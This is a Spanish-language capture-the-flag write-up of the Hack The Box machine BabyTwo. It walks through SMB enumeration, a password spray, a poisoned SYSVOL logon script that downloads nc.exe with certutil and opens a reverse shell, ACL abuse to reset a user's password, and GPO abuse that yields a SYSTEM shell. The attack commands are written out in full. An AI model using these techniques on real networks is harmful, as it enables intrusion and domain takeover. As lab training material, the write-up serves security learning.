---
tags:
title: BabyTwo - Medium (HTB)
permalink: /BabyTwo-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49667,58805,58841,62383,62384,62401 10.129.234.72
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-15 16:57 -0300
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 55.00% done; ETC: 16:57 (0:00:18 remaining)
Nmap scan report for DC (10.129.234.72)
Host is up (1.00s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-15 19:58:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-15T19:59:58+00:00
|_ssl-date: 2026-01-15T20:00:35+00:00; +1m39s from scanner time.
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2025-08-18T14:29:57
|_Not valid after:  2026-02-17T14:29:57
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
58805/tcp open  msrpc         Microsoft Windows RPC
58841/tcp open  msrpc         Microsoft Windows RPC
62383/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62384/tcp open  msrpc         Microsoft Windows RPC
62401/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-15T20:00:00
|_  start_date: N/A
|_clock-skew: mean: 1m38s, deviation: 0s, median: 1m38s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.65 seconds
```

### SMB

Como el usuario de invitados `(Guest)` esta habilitado, enumere `Shares`.

```bash
nxc smb 10.129.234.72 -u guest -p '' --shares
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [+] baby2.vl\guest: 
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ            
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs                            
SMB         10.129.234.72   445    DC               homes           READ,WRITE      
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.72   445    DC               SYSVOL                          Logon server share 
```

Me conecte con `smbclient`, analice el contenido de `/dev` y encontré un archivo `vbs`, por ahora nada interesante.

```bash
impacket-smbclient baby2.vl/guest@DC.baby2.vl -no-pass -dc-ip 10.129.234.72
# cd dev
ls# ls
drw-rw-rw-          0  Thu Sep  7 16:20:13 2023 .
drw-rw-rw-          0  Thu Sep  7 16:20:13 2023 ..
-rw-rw-rw-        108  Thu Sep  7 16:20:13 2023 CHANGELOG
-rw-rw-rw-       1800  Thu Sep  7 16:20:13 2023 login.vbs.lnk
```
### spider_plus

Use el modulo `spider_plus` de nxc, para enumerar los demas recursos a los que tengo acceso
```bash
nxc smb 10.129.234.72 -u guest -p '' -M spider_plus
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [+] baby2.vl\guest: 
SPIDER_PLUS 10.129.234.72   445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.234.72   445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.234.72   445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.234.72   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.234.72   445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.234.72   445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.234.72   445    DC               [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ            
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs                            
SMB         10.129.234.72   445    DC               homes           READ,WRITE      
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.72   445    DC               SYSVOL                          Logon server share 
SPIDER_PLUS 10.129.234.72   445    DC               [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.129.234.72.json".
<SNIP>
```
### Password spray

Pero me mostro lo mismo, además en el recurso `NETLOGON` esta el mismo archivo.

```json
# use netlogon
ls
# ls
drw-rw-rw-          0  Mon Aug 25 05:30:39 2025 .
drw-rw-rw-          0  Tue Aug 22 14:43:55 2023 ..
-rw-rw-rw-        992  Mon Aug 25 08:23:29 2025 login.vbs
# get login.vbs
```

Luego en `/homes` estan las carpetas de los usuarios.

```bash
# ls
drw-rw-rw-          0  Thu Jan 15 17:06:45 2026 .
drw-rw-rw-          0  Tue Aug 22 17:10:21 2023 ..
drw-rw-rw-          0  Tue Aug 22 17:18:40 2023 Amelia.Griffiths
drw-rw-rw-          0  Tue Aug 22 17:18:40 2023 Carl.Moore
drw-rw-rw-          0  Tue Aug 22 17:18:40 2023 Harry.Shaw
drw-rw-rw-          0  Tue Aug 22 17:18:40 2023 Joan.Jennings
drw-rw-rw-          0  Tue Aug 22 17:18:40 2023 Joel.Hurst
drw-rw-rw-          0  Tue Aug 22 17:18:40 2023 Kieran.Mitchell
drw-rw-rw-          0  Sat Sep  2 11:45:25 2023 library
drw-rw-rw-          0  Tue Aug 22 17:18:40 2023 Lynda.Bailey
drw-rw-rw-          0  Tue Aug 22 17:18:40 2023 Mohammed.Harris
drw-rw-rw-          0  Tue Aug 22 17:18:40 2023 Nicola.Lamb
drw-rw-rw-          0  Tue Aug 22 17:18:40 2023 Ryan.Jenkins
-rw-rw-rw-       2164  Thu Jan 15 17:08:09 2026 zsln.lnk
-rw-rw-rw-         85  Thu Jan 15 17:06:26 2026 zsln.scf
```

Cree una lista de estos, y realice un `Password spray` dándome `2` coincidencias.

```bash
nxc smb 10.129.234.72 -u users  -p users --no-brute --continue-on-success
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Amelia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Harry.Shaw:Harry.Shaw STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Joan.Jennings:Joan.Jennings STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Joel.Hurst:Joel.Hurst STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Kieran.Mitchell:Kieran.Mitchell STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [+] baby2.vl\library:library 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Lynda.Bailey:Lynda.Bailey STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Mohammed.Harris:Mohammed.Harris STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Nicola.Lamb:Nicola.Lamb STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Ryan.Jenkins:Ryan.Jenkins STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [+] baby2.vl\: 
```
## Shell as amelia.griffiths

Con estas credenciales enumere el dominio con `bloodhound-python` para mas adelante.

```bash
bloodhound-python -ns 10.129.234.72 -u Carl.Moore -p 'Carl.Moore' -d baby2.vl -c all              
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: baby2.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.baby2.vl
INFO: Testing resolved hostname connectivity dead:beef::d793:765f:3d47:ceb4
INFO: Trying LDAP connection to dead:beef::d793:765f:3d47:ceb4
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.baby2.vl
INFO: Testing resolved hostname connectivity dead:beef::d793:765f:3d47:ceb4
INFO: Trying LDAP connection to dead:beef::d793:765f:3d47:ceb4
INFO: Found 16 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.baby2.vl
INFO: Done in 01M 44S
```

### Poisoning .vbs 

Me di cuenta que en `SYSVOL`, recurso desde el cual antes no tenia acceso, estaba el mismo `login.vbs`. Donde con ayuda de la `IA`, lo sobrescribí, con un comando el cual descargue el `nc.exe` desde mi maquina. 

```bash
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")    
  
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next
    
    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If
    
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
    
    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"

On Error Resume Next ' Evita que el usuario vea errores si la descarga falla
Dim objShell
Set objShell = CreateObject("WScript.Shell")

' Comando para descargar el archivo usando certutil
' El parámetro "0" al final indica que la ventana debe estar oculta
' El "True" indica que el script debe esperar a que termine antes de seguir
Dim comando
comando = "certutil.exe -urlcache -f -split http://10.10.17.19/nc.exe C:\programdata\nc.exe; C:\programdata\nc.exe 10.10.17.19 4444 -e cmd"

objShell.Run comando, 0, True

Set objShell = Nothing
```
### Shell

Luego me conecte al recurso y lo subi, borrando el original.

```bash
impacket-smbclient baby2.vl/Carl.Moore:Carl.Moore@DC.baby2.vl -dc-ip 10.129.234.72
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use sysvol
# cd baby2.vl/scripts
# ls
drw-rw-rw-          0  Thu Jan 15 17:36:10 2026 .
drw-rw-rw-          0  Tue Aug 22 14:43:55 2023 ..
-rw-rw-rw-        851  Thu Jan 15 17:36:11 2026 login.vbs
# rm login.vbs
# put login.vbs
# ls
drw-rw-rw-          0  Thu Jan 15 17:41:04 2026 .
drw-rw-rw-          0  Tue Aug 22 14:43:55 2023 ..
-rw-rw-rw-       1455  Thu Jan 15 17:41:05 2026 login.vbs
```
### Malicious index

Y después de unos segundos, veo como desde mi servidor en `python` se hacen peticiones al `index.html`, y además haciendo la descarga del binario.

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.234.72 - - [15/Jan/2026 17:41:29] "POST / HTTP/1.1" 501 -
10.129.234.72 - - [15/Jan/2026 17:41:32] "GET / HTTP/1.1" 200 -
10.129.234.72 - - [15/Jan/2026 17:41:37] "GET /nc.exe HTTP/1.1" 200 -
10.129.234.72 - - [15/Jan/2026 17:41:40] code 501, message Unsupported method ('POST')
10.129.234.72 - - [15/Jan/2026 17:41:40] "POST / HTTP/1.1" 501 -
10.129.234.72 - - [15/Jan/2026 17:41:42] "GET /nc.exe HTTP/1.1" 200 -
```

Como el nc ya lo descargo, y veo que hace peticiones a mi `index.html`, cree uno con el contenido que tiene que ejecutar para recibir mi shell.

```bash
cat index.html             
C:\programdata\nc.exe -e cmd.exe 10.10.17.19 4444
```

Y luego de unos segundos recibo mi shell.

```bash
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.72] 61537
whoami
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
baby2\amelia.griffiths
```

```powershell
c:\Users\Public>type C:\user.txt
type C:\user.txt
42783b2c1483aeb70eca6810f0645c38
```
## Shell as nt authority\system

Viendo los permisos de este usuario, veo que cuenta con `WriteDacl` sobre `gpoadm`.

![image-center](/assets/images/Pasted image 20260115174837.png)

Para poder abusar de este use `PowerView`, de manera que como ya estoy en el grupo `Legacy`, puedo cambiar mis permisos sobre este usuario, asi que primero descargue el script, y luego importe el modulo para tener acceso a sus funciones.

```powershell
c:\Users\Public>certutil -urlcache -split -f http://10.10.17.19/PowerView.ps1 C:\programdata\PowerView.ps1
certutil -urlcache -split -f http://10.10.17.19/PowerView.ps1 C:\programdata\PowerView.ps1
****  Online  ****
  000000  ...
  0bc0e7
CertUtil: -URLCache command completed successfully.
PS C:\ProgramData> Import-Module .\PowerView.ps1
Import-Module .\PowerView.ps1
```
### Change password

Para apropiarme de este usuario, primero necesito tener los máximos privilegios sobre este, para eso uso `Add-DomainObjectAcl`.

```powershell
PS C:\ProgramData> Add-DomainObjectAcl -TargetIdentity gpoadm -PrincipalIdentity Amelia.Griffiths -Rights All
```

Ya después puedo cambiarle la password con `Set-DomainUserPassword`.

```powershell
PS C:\ProgramData> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\ProgramData> Set-DomainUserPassword -Identity gpoadm -AccountPassword $SecPassword
```
### Validate creds

Para comprobar si el cambio se realizo, use `nxc`.

```bash
nxc smb baby2.vl -u gpoadm -p 'Password123!'
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.72   445    DC               [+] baby2.vl\gpoadm:Password123!
```

### GPO Abuse

Ya después con el uso de [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) pude hacer uso de los privilegios que este usuario cuenta sobre dos `Group Policy Objects`, donde para ejecutar el comando necesito el `GUID` de esta GPO, que la misma se puede ver en bloodhound.

```bash
python3 pygpoabuse.py 'baby2.vl/gpoadm:Password123!' -dc-ip 10.129.234.72 -powershell -command "C:\programdata\nc.exe 10.10.17.19 1337 -e cmd" -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9'
SUCCESS:root:ScheduledTask TASK_bab4739c created!
[+] ScheduledTask TASK_bab4739c created!
```
### Shell

Luego para que el cambio se aplique actualice las `GPOs`.

```powershell
PS C:\ProgramData> gpupdate /force
gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

Y luego de unos segundos, estaba ahí mi shell como `system`.

```powershell
rlwrap -cAr nc -nlvp 1337                                                     
listening on [any] 1337 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.72] 62229
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```powershell
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
293500962edc31fa154951eeeb5740f9
```

`~Happy Hacking.`